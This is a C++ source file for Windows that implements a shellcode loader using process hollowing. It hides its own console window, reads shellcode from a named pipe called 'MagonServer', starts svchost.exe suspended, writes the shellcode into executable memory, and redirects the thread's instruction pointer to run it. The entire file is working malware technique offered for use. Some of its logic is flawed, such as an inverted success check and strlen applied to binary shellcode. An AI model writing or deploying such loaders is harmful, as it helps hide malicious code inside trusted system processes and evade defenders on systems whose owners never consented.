#include <Windows.h>
#include <iostream>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

HANDLE hPipeClient = nullptr;
DWORD dwPipeMode = 0, dwReadBytes = 0;
BOOL bConnected = FALSE, bReceived = FALSE, bProcessOpened = FALSE, bWroteMemory = FALSE;
CONTEXT c{};

const LPCWSTR pipeName = L"\\\\.\\pipe\\MagonServer";
const unsigned int buffSize = 4096;

typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);

/* function to hide window and run in the background */
void StealthMode() {
    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", nullptr);
    ShowWindow(stealth, 0);
}

int main() {

    /* hide the program*/
    StealthMode();

    /* connect to a pipe */
    hPipeClient = CreateFileW(
        pipeName, // the pipe name
        GENERIC_WRITE | GENERIC_READ, // read and write from the pipe
        0, // no sharing
        NULL, // default security attributes
        OPEN_EXISTING, // open existing pipe
        0, // default attributes
        NULL // no template file
    );

    /* check for the return value of CreateFile */
    if (hPipeClient == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed in opening the server pipeline\n" << std::endl;
        return EXIT_FAILURE;
    }

    dwPipeMode = PIPE_READMODE_MESSAGE;
    /* changing the pipe handle mode to read mode */
    bConnected = SetNamedPipeHandleState(
        hPipeClient, // the pipe handle
        &dwPipeMode, // the pipe mode to read from the server
        NULL, // default Collection Count
        NULL  // default Collection Data Timeout
    );

    /* check for the return value of SetNamedPipeHandleState */
    if (bConnected == FALSE) {
        std::cerr << "Failed in setting the pipe mode to read from the server, error code: " << GetLastError() << std::endl;
        CloseHandle(hPipeClient);
        return EXIT_FAILURE;
    }

    /* creating the buffer for the shellcode + reading it from the server */
    char buffer[buffSize];

    /* fill the buffer with nullterminators */
    std::fill_n(buffer, buffSize, '\0');

    bReceived = ReadFile(
        hPipeClient,
        (LPVOID)buffer,
        buffSize,
        &dwReadBytes,
        NULL
    );

    /* check for the return value of ReadFile */
    if (bReceived == FALSE) {
        std::cerr << "Failed in reading the data from the server, error code: " << GetLastError() << std::endl;
        CloseHandle(hPipeClient);
        return EXIT_FAILURE;
    }

    std::cout << buffer << std::endl;
    std::cout << strlen(buffer) << std::endl;

    /* cleaning up */
    CloseHandle(hPipeClient);

    /* initialize info for the hollowrd process */
    STARTUPINFOA startupinfo;
    ZeroMemory(&startupinfo, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);

    PROCESS_INFORMATION processinfo;
    ZeroMemory(&processinfo, sizeof(processinfo));

    /* creating a notepad process to hollow */
    bProcessOpened = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED, // for hollowing
        NULL,
        NULL,
        &startupinfo,
        &processinfo
    );

    /* check for the return value of CreateProcessA */
    if (bProcessOpened == FALSE) {
        std::cerr << "Failed in creating a process to hollow, error code: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    /* buffer for the start address of the hollow memory */
    PVOID bufferAddress = nullptr;

    auto hNtdllBase = GetModuleHandleA("ntdll.dll");
    if (hNtdllBase == NULL) {
        std::cerr << "Failed in getting ntdll.dll from the OS, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* getting the unmap function from ntdll.dll */
    pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");

    /* check for the return value of ZwUnmapViewOfSection */
    DWORD dwResult = pZwUnmapViewOfSection(
        processinfo.hProcess,
        bufferAddress
    );
    if (!dwResult) {
        std::cerr << "Failed in unmapping the process to hollow, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* allocating the shellcode size into the memory of the process */
    LPVOID start_address = VirtualAllocEx(
        processinfo.hProcess,
        (LPVOID)bufferAddress,
        strlen(buffer),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    /* check for the return value of VirtualAllocEx */
    if (start_address == NULL) {
        std::cerr << "Failed in allocating memory for the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    DWORD dwOld = 0;
    DWORD dwNew = 0;

    /* changing the memory protection mode to read/write/execute */
    if (VirtualProtectEx(
        processinfo.hProcess,
        start_address,
        strlen(buffer),
        PAGE_EXECUTE_READWRITE,
        &dwOld
    ) == FALSE) {
        std::cerr << "Failed in changing the memory to read/write/execute for the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* writing the shellcode inside the process's memory */
    bWroteMemory = WriteProcessMemory(
        processinfo.hProcess,
        start_address,
        buffer,
        strlen(buffer),
        NULL
    );

    /* changing the memory protection mode to read/write/execute */
    if (VirtualProtectEx(
        processinfo.hProcess,
        start_address,
        strlen(buffer),
        dwOld,
        &dwNew
    ) == FALSE) {
        std::cerr << "Failed in returning the memory's original permissions in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* check for the return value of WriteProcessMemory */
    if (bWroteMemory == FALSE) {
        std::cerr << "Failed in writing the shellcode in the hollowed process, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* getting the context of the thread */
    c.ContextFlags = CONTEXT_ALL;
    if (GetThreadContext(processinfo.hThread, &c) == FALSE) {
        std::cerr << "Failed in getting the hollowed process's thread context, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }
    
    /* changing rip to point to the start of the shellcode */
    c.Rip = reinterpret_cast<DWORD64>(start_address);

    /* setting the thread's context to the new one */
    if (SetThreadContext(processinfo.hThread, &c) == FALSE) {
        std::cerr << "Failed in setting the hollowed process's thread context, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* resuming the thread */
    if (ResumeThread(processinfo.hThread) == -1) {
        std::cerr << "Failed in resuming the hollowed process's thread, error code: " << GetLastError() << std::endl;
        TerminateProcess(processinfo.hProcess, 0);
        return EXIT_FAILURE;
    }

    /* cleaning up */
    CloseHandle(processinfo.hProcess);
    CloseHandle(processinfo.hThread);

    return 0;
}
